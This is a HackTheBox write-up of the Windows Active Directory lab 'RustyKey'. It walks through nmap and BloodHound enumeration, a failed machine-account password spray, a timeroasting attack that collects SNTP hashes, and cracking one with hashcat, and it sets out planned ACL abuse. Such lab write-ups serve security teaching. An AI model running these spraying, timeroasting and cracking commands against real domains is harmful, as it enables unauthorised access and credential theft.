---
render_with_liquid: false
title: HackTheBox Writeup - RustyKey
date: 2025-07-15 08:35:19 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, bloodhound-ce, bloodhound-ce-python, bloodhound-cli, ldeep, netexec, timeroasting, hashcat, dacl-abuse, ad-protected-users, evil-winrm, winrm-access-spray, reverse-ssh, runascs, privesccheck, dll-hijack, win-dll, ad-rbcd, impacket]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c458b48070ca6f3073128d085c9ee247.png
    width: 640
    height: 480
---



`RustyKey` is a hard difficulty Windows Machine which showcases a Timeroasting Attack, Active Directory ACL abuse following Windows Group Policy Enumeration to abuse the 7-Zip Shell Extension. For Privilege escalation, Active Directory Delegations are abused using a SPN-less Resource-Based Constrained Delegation attack.


# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ pt init '10.10.11.75 dc.rustykey.htb rustykey.htb dc'
+----------+--------+-------------+-----------------+
| PROFILE  | STATUS |     IP      |     DOMAIN      |
+----------+--------+-------------+-----------------+
| rustykey | on     | 10.10.11.75 | dc.rustykey.htb |
| rustykey | on     | 10.10.11.75 | rustykey.htb    |
| rustykey | on     | 10.10.11.75 | dc              |
+----------+--------+-------------+-----------------+

╒═══════════╤═════════════╤═════════════════╤══════════════╤═════════════╤═══════════╤═════════════════╕
│ profile   │ lhost       │ rhost           │ domain       │ ip          │ dc_name   │ dc_fqdn         │
╞═══════════╪═════════════╪═════════════════╪══════════════╪═════════════╪═══════════╪═════════════════╡
│ rustykey  │ 10.10.14.59 │ dc.rustykey.htb │ rustykey.htb │ 10.10.11.75 │ dc        │ dc.rustykey.htb │
╘═══════════╧═════════════╧═════════════════╧══════════════╧═════════════╧═══════════╧═════════════════╛
```

## Nmap

```bash
# Nmap 7.95 scan initiated Tue Jul 15 08:35:19 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,5985,9389,47001,49281,49665,49668,49671,49676,49677,49681,49682,49698,49727, 10.10.11.75
Nmap scan report for 10.10.11.75
Host is up, received user-set (0.43s latency).
Scanned at 2025-07-15 08:35:19 CST for 95s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-15 17:50:46Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49281/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51928/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 28315/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 63867/udp): CLEAN (Timeout)
|   Check 4 (port 39487/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-07-15T17:52:05
|_  start_date: N/A
|_clock-skew: 17h15m17s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 15 08:36:54 2025 -- 1 IP address (1 host up) scanned in 95.27 seconds
```


# User Flag
---

## Auth as rr.parker


### Setup AD environment

Get **Domain** name and **Domain Controller** name -> Add to `/etc/hosts` -> Generate kerberos config

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ nxc smb $(pt get ip) --smb-timeout 10 --generate-hosts-file .pt/hosts && cat .pt/hosts | sudo tee -a /etc/hosts && sudo ~/scripts/ad/sync_ntp.sh $(pt get ip) && pt set rhost `cat .pt/hosts | awk '{print $2}' | tail -n1` && pt set domain `cat .pt/hosts | awk '{print $3}' | tail -n1` && nxc smb -k $(pt get rhost) --smb-timeout 10 --generate-krb5-file .pt/krb5.conf && sudo cp .pt/krb5.conf /etc/krb5.conf && cat /etc/krb5.conf
SMB         10.10.11.75     445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
10.10.11.75     dc.rustykey.htb rustykey.htb dc
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-07-16 01:55:33.167878 (+0800) -0.000283 +/- 0.041863 10.10.11.75 s1 no-leap

Done syncing time with NTP server: 10.10.11.75
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = RUSTYKEY.HTB

[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
        default_domain = rustykey.htb
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
```


### Assumed breach scenario

![](/assets/obsidian/9a71cb3edb58e4a2e2c076b019de8306.png)

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ creds-set 'rr.parker' '8#t5HE8L!W3A'
[+] Password set for user rr.parker

┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.13.0.dev0+20250714.130102.b6ff7ac6 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in rr.parker.ccache
```


## Auth as IT-Computer3$


### Domain Enumeration


#### Bloodhound

Run collectors

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ KRB5CCNAME="$(pt get ticket)" bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -k -no-pass
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: rustykey.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 19S
INFO: Compressing output into 20250716094705_bloodhound.zip
```

Start bloodhound

```bash
sudo docker-compose -f /opt/sectools/ad/bloodhound-ce/docker-compose.yml up
```


##### Attack paths

- `MM.TURNER` can configure **RBCD** on `DC.RUSTYKEY.HTB`, leading to compromise of domain controller

![](/assets/obsidian/aece07a523aa268d312d49e2bec42861.png)


#### bhcli


##### Upload the latest collected data

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli upload `ls -t *_bloodhound.zip | head -1`
INFO: Starting new file upload job...
INFO: Uploading file 20250716094705_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.
```


##### Statistics

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ RUSTYKEY.HTB       │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │      12 │       8 │
│ Computer Accounts  │      16 │      16 │
│ Domain Admins      │       1 │       1 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       3 │       2 │
│ Groups             │      57 │         │
│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘
```


##### Users with description

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli users -d "$(pt get domain)" --description
ADMINISTRATOR@RUSTYKEY.HTB      Built-in account for administering the computer/domain
BACKUPADMIN@RUSTYKEY.HTB
BB.MORGAN@RUSTYKEY.HTB
DD.ALI@RUSTYKEY.HTB
EE.REED@RUSTYKEY.HTB
GG.ANDERSON@RUSTYKEY.HTB
GUEST@RUSTYKEY.HTB      Built-in account for guest access to the computer/domain
KRBTGT@RUSTYKEY.HTB     Key Distribution Center Service Account
MM.TURNER@RUSTYKEY.HTB
NN.MARCOS@RUSTYKEY.HTB
NT AUTHORITY@RUSTYKEY.HTB
RR.PARKER@RUSTYKEY.HTB
```


##### Membership info

- Tier 0 users

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli cypher 'MATCH p = (u:User)-[:MemberOf]->(:Base) WHERE "admin_tier_0" IN split(u.system_tags, " ") RETURN p LIMIT 1000' | jq '.[] | map(select(.kind=="User"))[] | .properties.samaccountname' -r
backupadmin
Administrator
```

- **Winrm** Access

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli members 'REMOTE MANAGEMENT USERS@RUSTYKEY.HTB' -i
BB.MORGAN@RUSTYKEY.HTB
EE.REED@RUSTYKEY.HTB
GG.ANDERSON@RUSTYKEY.HTB
```


##### Audit

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli audit -d "$(pt get domain)"
RUSTYKEY.HTB
============

[*] Interesting privileges for domain users or computers
    0 relations found

[*] Interesting privileges for guests
    0 relations found

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found
```


#### Ldeep


##### Query data from LDAP

```bash
mkdir -p ldeep && KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d "$(pt get domain)" -s "ldap://$(pt get dc_fqdn)" all ldeep/
```


##### Insight

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 2127794 Jul 16 09:48 ldeep/_schema.lst
-rw-r--r-- 1 bravosec kali    3102 Jul 16 09:48 ldeep/_server_info.lst
-rw-r--r-- 1 bravosec kali    2017 Jul 16 09:48 ldeep/_dns_records.lst
-rw-r--r-- 1 bravosec kali    1119 Jul 16 09:48 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali     473 Jul 16 09:48 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali     456 Jul 16 09:47 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali     340 Jul 16 09:48 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali     264 Jul 16 09:48 ldeep/_machines.lst
-rw-r--r-- 1 bravosec kali     205 Jul 16 09:48 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali     136 Jul 16 09:48 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali     106 Jul 16 09:48 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali      99 Jul 16 09:48 ldeep/_users_nopasswordexpire.lst
-rw-r--r-- 1 bravosec kali      81 Jul 16 09:48 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali      34 Jul 16 09:48 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali      25 Jul 16 09:48 ldeep/_users_disabled.lst
-rw-r--r-- 1 bravosec kali      24 Jul 16 09:48 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali      19 Jul 16 09:47 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali      19 Jul 16 09:47 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali       6 Jul 16 09:48 ldeep/_users_passwordnotrequired.lst
```


##### Interesting users

![](/assets/obsidian/6d64d85ef3bca88630a2915a30df1e96.png)


### User access check


#### AD

- `Authenticated Users` group is a member of `PRE-WINDOWS 2000 COMPATIBLE ACCEESS` group

![](/assets/obsidian/0174d4d2aa7458cb48f3c33c53ae68b8.png)


#### SMB Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache -M spider_plus --smb-timeout 10 --log nxc_shares.log
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] RUSTYKEY.HTB\rr.parker from ccache
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] Started module spidering_plus with the following options:
SPIDER_PLUS dc.rustykey.htb 445    dc               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS dc.rustykey.htb 445    dc               [*]     STATS_FLAG: True
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS dc.rustykey.htb 445    dc               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS dc.rustykey.htb 445    dc               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS dc.rustykey.htb 445    dc               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.rustykey.htb 445    dc               C$                              Default share
SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share
SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share
SPIDER_PLUS dc.rustykey.htb 445    dc               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/dc.rustykey.htb.json".
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] SMB Filtered Shares:  1
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] Total folders found:  23
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] Total files found:    5
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] File size average:    1.63 KB
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] File size min:        23 B
SPIDER_PLUS dc.rustykey.htb 445    dc               [*] File size max:        4.58 KB
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ cat ~/".nxc/modules/nxc_spider_plus/$(pt get rhost).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
SYSVOL/rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                              2024-12-27 08:59:39  2.73 KB
SYSVOL/rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                           2024-12-29 06:38:26  23 B
SYSVOL/rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2024-12-29 06:38:26  800 B
SYSVOL/rustykey.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                           2025-06-25 06:59:55  23 B
SYSVOL/rustykey.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-06-25 06:59:55  4.58 KB
```


### (Failed) 88 - Kerberos : Password spray

Machine accounts in `PRE-WINDOWS 2000 COMPATIBLE ACCEESS` group might have default password set as its username in **lowercase** without `$` character at the end (e.g. : `ComputerACC$` -> `computeracc`), lets spray passwords

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ cat ldeep/_machines.lst | tr '[:upper:]' '[:lower:]' | sed 's/.$//' > pw2000ca_pass.lst

┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log --continue-on-success --no-bruteforce -u ldeep/_machines.lst -p pw2000ca_pass.lst
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\IT-Computer5$:it-computer5 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\IT-Computer4$:it-computer4 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\IT-Computer3$:it-computer3 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\IT-Computer2$:it-computer2 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\IT-Computer1$:it-computer1 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer5$:finance-computer5 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer4$:finance-computer4 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer3$:finance-computer3 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer2$:finance-computer2 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Finance-Computer1$:finance-computer1 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer5$:support-computer5 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer4$:support-computer4 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer3$:support-computer3 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer2$:support-computer2 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Support-Computer1$:support-computer1 KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\DC$:dc KDC_ERR_PREAUTH_FAILED
```


### Timeroasting

Check low hanging fruits by automating **netexec** modules

![](/assets/obsidian/612d7aeea6bcd6a3c499d456269a1d0a.png)

> Windows authenticates NTP requests by calculating the message digest using the NT hash followed by the first 48 bytes of the NTP message (all fields preceding the key ID). 
> An attacker can abuse this to recover hashes that can be cracked offline for machine and trust accounts. The attacker must know the accounts RID, but because RIDs are sequential, they can easily be enumerated.
{: .prompt-info }

```bash
----------------------------------------
[*] nxc ldap dc.rustykey.htb --use-kcache --log nxc_automator.log -M timeroast
----------------------------------------
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
TIMEROAST   dc.rustykey.htb 445    dc               [*] Starting Timeroasting...
TIMEROAST   dc.rustykey.htb 445    dc               1000:$sntp-ms$18875ce5db7bcca317ad6bcfa38729a6$1c0111e900000000000a5a304c4f434cec24ec2f391bcc0ee1b8428bffbfcd0aec25631608fae5e4ec25631608fb168c
TIMEROAST   dc.rustykey.htb 445    dc               1103:$sntp-ms$fccc090a7105d79c0f1d26e94fbe025d$1c0111e900000000000a5a304c4f434cec24ec2f38c570b7e1b8428bffbfcd0aec256316a4cd8c0fec256316a4cdad9d
TIMEROAST   dc.rustykey.htb 445    dc               1104:$sntp-ms$843e0bf04ad0826ed1ec6747a1d52049$1c0111e900000000000a5a304c4f434cec24ec2f3a5177c1e1b8428bffbfcd0aec256316a659916bec256316a659b4a7
TIMEROAST   dc.rustykey.htb 445    dc               1105:$sntp-ms$fadc91d95a2800ff162e79641093f204$1c0111e900000000000a5a304c4f434cec24ec2f3bd14785e1b8428bffbfcd0aec256316a7d95f82ec256316a7d982bd
TIMEROAST   dc.rustykey.htb 445    dc               1106:$sntp-ms$d175abad6754675398f7d1b3b1081ef2$1c0111e900000000000a5a304c4f434cec24ec2f3985b25ce1b8428bffbfcd0aec256316a964dcf9ec256316a964f7d1
TIMEROAST   dc.rustykey.htb 445    dc               1107:$sntp-ms$442dd2fae626f2bf4c973b4a1a77d69c$1c0111e900000000000a5a304c4f434cec24ec2f3b0eff77e1b8428bffbfcd0aec256316aaee250cec256316aaee469a
TIMEROAST   dc.rustykey.htb 445    dc               1118:$sntp-ms$f525fbf489f70d171239eb87c925a331$1c0111e900000000000a5a304c4f434cec24ec2f3b40f4bce1b8428bffbfcd0aec256316bb40e5a3ec256316bb40fd20
TIMEROAST   dc.rustykey.htb 445    dc               1119:$sntp-ms$d481906297c2d20ca963400c369dbbb2$1c0111e900000000000a5a304c4f434cec24ec2f3902c4d6e1b8428bffbfcd0aec256316bcd9bffaec256316bcd9d924
TIMEROAST   dc.rustykey.htb 445    dc               1120:$sntp-ms$15f7eb2cd9d27f9944b90de917a9d1c7$1c0111e900000000000a5a304c4f434cec24ec2f3a8f308ae1b8428bffbfcd0aec256316be66234aec256316be664833
TIMEROAST   dc.rustykey.htb 445    dc               1121:$sntp-ms$00f83ea25b46e9d61c101a22e1921d4f$1c0111e900000000000a5a304c4f434cec24ec2f3c0e892fe1b8428bffbfcd0aec256316bfe57f4bec256316bfe59d7e
TIMEROAST   dc.rustykey.htb 445    dc               1122:$sntp-ms$43189b15f075d5ec3cca18532163ea05$1c0111e900000000000a5a304c4f434cec24ec2f3983c6c9e1b8428bffbfcd0aec256316c1735059ec256316c1736e8c
TIMEROAST   dc.rustykey.htb 445    dc               1123:$sntp-ms$6548bd460fece01d2501547188f42e7a$1c0111e900000000000a5a304c4f434cec24ec2f3984845ee1b8428bffbfcd0aec256316c1740deeec256316c1742dcf
TIMEROAST   dc.rustykey.htb 445    dc               1124:$sntp-ms$94477e678fc0cfaf597751495d456eeb$1c0111e900000000000a5a304c4f434cec24ec2f3b05dcb8e1b8428bffbfcd0aec256316c2f567f6ec256316c2f58629
TIMEROAST   dc.rustykey.htb 445    dc               1125:$sntp-ms$dc4d45890c26cf0f2afcbca87f84b633$1c0111e900000000000a5a304c4f434cec24ec2f38800eaee1b8428bffbfcd0aec256316c4882f0eec256316c4884b93
TIMEROAST   dc.rustykey.htb 445    dc               1126:$sntp-ms$e6d9e9410cf24949caeafc0eef494a39$1c0111e900000000000a5a304c4f434cec24ec2f39bd81d6e1b8428bffbfcd0aec256316c5c5a236ec256316c5c5bebb
TIMEROAST   dc.rustykey.htb 445    dc               1127:$sntp-ms$aef21cdbbe522c7f6871fa15aaaf3e92$1c0111e900000000000a5a304c4f434cec24ec2f3bd14fe9e1b8428bffbfcd0aec256316c7d96ceeec256316c7d98cce
```

We can check computers that doesn't rotate password (Computers inside AD domain rotate password every 30 days by default)

```bash
cat ldeep/_machines.json | jq 'sort_by(.pwdLastSet) | .[] | {pwdLastSet, objectSid, dn}' -c
```

`DC` was the only computer with a password that was not manually set, we can measure the `Maximum machine account password age` for this domain was more than `180` days

![](/assets/obsidian/b373f33c3b1d8131b300aef08ce19d13.png)

Extract computers' RID that had password manually set

```bash
DAYS='180'; CUTOFF=$(pwsh -c "(Get-Date).AddDays(-$DAYS).ToFileTimeUtc()"); KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d "$(pt get domain)" -s "ldap://$(pt get dc_fqdn)" search "(&(objectClass=computer)(pwdLastSet<=$CUTOFF))" objectSid | jq '.[].objectSid' -r | awk -F- '{print $NF}' > machines_pwdset.lst
```

Extract **timeroastable** hashes

```bash
cat nxc_automator.log | grep 'INFO - TIMEROAST' | awk '{print $NF}' | grep -F '$' | sort -u | grep -f <(sed -e 's/^/^/' -e 's/$/:/' machines_pwdset.lst) > timeroastables.txt
```

Crack hashes (It needs the latest [hashcat](https://hashcat.net/beta/))

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ /opt/sectools/password-attacks/Cracking/hashcat-6.2.6/hashcat.bin timeroastables.txt /opt/wordlists/rockyou.txt -m 31300 --user
hashcat (v6.2.6-1455-g58b5d15e6) starting
[...]

┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ /opt/sectools/password-attacks/Cracking/hashcat-6.2.6/hashcat.bin timeroastables.txt /opt/wordlists/rockyou.txt -m 31300 --user --show
Mixing --show with --username or --dynamic-x can cause exponential delay in output.

1125:$sntp-ms$9314beab64389dd8ec71c21e013818ee$1c0111e900000000000a5af54c4f434cec24ec2f39da1b69e1b8428bffbfcd0aec25641a41c9aa02ec25641a41c9c32d:Rusty88!
```

Get the user object via **RID**

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ cat ldeep/_machines.json | jq '.[] | select(.objectSid | contains("-1125"))' | grep -i samacc
  "sAMAccountName": "IT-Computer3$",
  "sAMAccountType": "SAM_GROUP_OBJECT | SAM_NON_SECURITY_GROUP_OBJECT | SAM_ALIAS_OBJECT | SAM_NON_SECURITY_ALIAS_OBJECT | SAM_USER_OBJECT | SAM_NORMAL_USER_ACCOUNT | SAM_MACHINE_ACCOUNT | SAM_TRUST_ACCOUNT | SAM_APP_QUERY_GROUP | SAM_ACCOUNT_TYPE_MAX",
```

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ creds-set 'IT-Computer3$' 'Rusty88!'
[+] Password set for user IT-Computer3$

┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.13.0.dev0+20250714.130102.b6ff7ac6 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in IT-Computer3$.ccache
```


## Shell as bb.morgan

### User access check


#### AD

- `IT-Computer3$` has rights to add itself to `Helpdesk` group

![](/assets/obsidian/2a3e0ed7399bf8b0feaae5953170ddc8.png)

- `Helpdesk` has rights to add members to `Protected Objects` group -> `Protected Users` group
- `Helpdesk` has rights to grant ownership on `DD.ALI` -> Attempt **Targeted Kerberoasting** -> `Finance` group
- `Helpdesk` has rights to force change passwords of `4` users
	- `EE.REED` -> **WINRM** access -> `Support` group
	- `BB.MORGAN` -> **WINRM** access
	- `DD.ALI` -> `Finance` group
	- ❌ `GG.Anderson` (Account disabled) -> **WINRM** access -> `IT` group

![](/assets/obsidian/f72fe1dfed646d35481e00393cd72eaa.png)

- All 3 users we own that have **WINRM** access are under `Protected Users` group

![](/assets/obsidian/31b5d8e05e11b61e09876f0983b5e0d3.png)

![](/assets/obsidian/53c15bdb96c90d5e2a137ff0ca55c99d.png)


